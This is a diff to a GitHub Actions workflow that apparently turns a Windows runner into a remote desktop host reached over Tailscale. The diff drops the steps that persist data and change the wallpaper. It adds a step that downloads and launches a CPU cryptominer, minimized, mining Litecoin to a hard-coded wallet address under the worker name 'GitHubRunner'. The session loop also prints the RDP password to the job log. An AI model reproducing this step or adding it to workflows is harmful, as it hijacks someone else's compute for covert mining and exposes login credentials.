@@ -78,36 +78,7 @@ jobs:
           }
           Write-Host "TCP connectivity successful!"
 
-      # --- Restore persisted data ---
-      - name: Download Desktop Data
-        uses: actions/download-artifact@v4
-        with:
-          name: desktop-data
-          path: C:\Users\RDP\Desktop
-        continue-on-error: true
-
-      - name: Download Downloads Data
-        uses: actions/download-artifact@v4
-        with:
-          name: downloads-data
-          path: C:\Users\RDP\Downloads
-        continue-on-error: true
-
-      - name: Download Documents Data
-        uses: actions/download-artifact@v4
-        with:
-          name: documents-data
-          path: C:\Users\RDP\Documents
-        continue-on-error: true
-
-      - name: Download MyApp Data
-        uses: actions/download-artifact@v4
-        with:
-          name: myapp-data
-          path: C:\MyAppData
-        continue-on-error: true
-
-      # --- Install Applications (no winget, 7-Zip only) ---
+      # --- Install 7-Zip ---
       - name: Install 7-Zip
         run: |
           $url = "https://www.7-zip.org/a/7z2301-x64.exe"
@@ -115,72 +86,28 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Minimal Glitch Wallpaper ---
-      - name: Download Minimal Glitch Wallpaper
+      # --- Install & Run Unmineable Miner (CPU, Litecoin) ---
+      - name: Install & Run Unmineable Miner (CPU, LTC)
         run: |
-          $url = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1920&q=80"
-          $path = "C:\Temp\mywallpaper.jpg"
-          if (!(Test-Path "C:\Temp")) { New-Item -ItemType Directory -Path "C:\Temp" | Out-Null }
-          Invoke-WebRequest -Uri $url -OutFile $path
+          $minerUrl = "https://github.com/Unmineable/UnmineableMiner/releases/latest/download/UnmineableMiner.zip"
+          $zipPath = "$env:TEMP\UnmineableMiner.zip"
+          $extractPath = "C:\UnmineableMiner"
+          Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          Remove-Item $zipPath
+          Start-Process -FilePath "$extractPath\UnmineableMiner.exe" -ArgumentList "--algorithm=rx", "--worker=GitHubRunner", "--coin=LTC", "--address=LNRU4LhMqkLiEPmhAgquNqnztJkCrpik7J", "--cpu" -WindowStyle Minimized
 
-      - name: Set Desktop Wallpaper
-        run: |
-          $code = @"
-          using System.Runtime.InteropServices;
-          public class Wallpaper {
-              [DllImport("user32.dll", SetLastError = true)]
-              public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-          }
-          "@
-          Add-Type $code
-          $path = "C:\Temp\mywallpaper.jpg"
-          [Wallpaper]::SystemParametersInfo(20, 0, $path, 3)
-
-      - name: Enable Windows Dark Mode
-        run: |
-          $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
-          if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }
-          Set-ItemProperty -Path $key -Name "AppsUseLightTheme" -Value 0
-          Set-ItemProperty -Path $key -Name "SystemUsesLightTheme" -Value 0
-
-      # --- Maintain Connection ---
-      - name: Maintain Connection
+      # --- Maintain Connection (Graceful Stop for Shutdown) ---
+      - name: Maintain Connection (Graceful Stop)
         run: |
           Write-Host "`n=== RDP ACCESS ==="
           Write-Host "Address: $env:TAILSCALE_IP"
           Write-Host "Username: RDP"
           Write-Host "Password: $(echo $env:RDP_CREDS)"
           Write-Host "==================`n"
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
-              Start-Sleep -Seconds 300
+          Write-Host "To stop RDP, create the file 'C:\STOP-RDP.txt' in your RDP session."
+          while (!(Test-Path 'C:\STOP-RDP.txt')) {
+              Write-Host "[$(Get-Date)] RDP Active - Create C:\STOP-RDP.txt to end session."
+              Start-Sleep -Seconds 30
           }
-
-      # --- Persist Data at the End ---
-      - name: Upload Desktop Data
-        uses: actions/upload-artifact@v4
-        with:
-          name: desktop-data
-          path: C:\Users\RDP\Desktop
-        continue-on-error: true
-
-      - name: Upload Downloads Data
-        uses: actions/upload-artifact@v4
-        with:
-          name: downloads-data
-          path: C:\Users\RDP\Downloads
-        continue-on-error: true
-
-      - name: Upload Documents Data
-        uses: actions/upload-artifact@v4
-        with:
-          name: documents-data
-          path: C:\Users\RDP\Documents
-        continue-on-error: true
-
-      - name: Upload MyApp Data
-        uses: actions/upload-artifact@v4
-        with:
-          name: myapp-data
-          path: C:\MyAppData
-        continue-on-error: true
+          Write-Host "STOP-RDP.txt detected. Ending session."
